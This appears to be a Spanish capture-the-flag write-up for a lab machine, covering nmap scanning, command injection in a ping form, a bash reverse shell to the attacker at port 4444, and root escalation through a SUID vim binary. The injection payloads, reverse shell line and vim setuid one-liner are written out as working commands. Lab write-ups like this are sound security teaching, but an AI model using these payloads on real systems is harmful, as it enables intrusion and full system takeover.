
## 1. Reconocimiento

```bash
sudo nmap -sS -p- --open --min-rate 5000 172.17.0.2 -oG nmap
nmap -sVC -p80 172.17.0.2 -oG servs
```

Un único puerto abierto:

- 80/tcp → Apache 2.4.58 (Ubuntu) — "Ping"

La web expone una herramienta de ping con un formulario GET que acepta una IP o dominio y lo pasa al sistema.

---
## 2. Command Injection — RCE como www-data

El parámetro `target` de `ping.php` se concatena directamente en un comando de sistema sin sanitizar. Al encadenar comandos con `||` o `;` se ejecutan instrucciones arbitrarias:

```
http://172.17.0.2/ping.php?target=%7C%7C+id
# || id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```
http://172.17.0.2/ping.php?target=%3B+pwd
# ; pwd
```

```
/var/www/html
```

RCE confirmado como `www-data`.

---
## 3. Reverse shell

Listener en la máquina atacante:

```bash
nc -lvnp 4444
```

Payload enviado via el parámetro vulnerable (URL-encoded en el navegador o Burp):

```
;bash -c "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"
```

Shell recibida como `www-data`.

> **Nota:** Se recomienda usar `nc` en vez de herramientas externas como penelope — `nc` suele estar disponible por defecto en el sistema objetivo y no depende de binarios externos.

---
## 4. Escalada de privilegios — SUID en vim.basic

```bash
sudo -l      # sudo no disponible
find / -perm -4000 2>/dev/null
```

```
/usr/bin/vim.basic
```

`vim.basic` tiene el bit SUID activo — se ejecuta con los privilegios del propietario del archivo (root) independientemente del usuario que lo invoque. Vim incluye soporte para Python3 integrado, lo que permite ejecutar código Python con el UID efectivo de root.

El payload aprovecha `os.setuid(0)` para fijar el UID real a 0 (root) antes de lanzar una shell:

```bash
/usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "/bin/bash")'
```

- `:py3` — ejecuta código Python3 desde dentro de vim
- `os.setuid(0)` — establece el UID real a root (posible porque vim tiene SUID)
- `os.execl("/bin/bash", "/bin/bash")` — reemplaza el proceso actual por una bash

```bash
id
# uid=0(root) gid=33(www-data) groups=33(www-data)
whoami
# root
```

Flag de root disponible en `/root/root.txt`.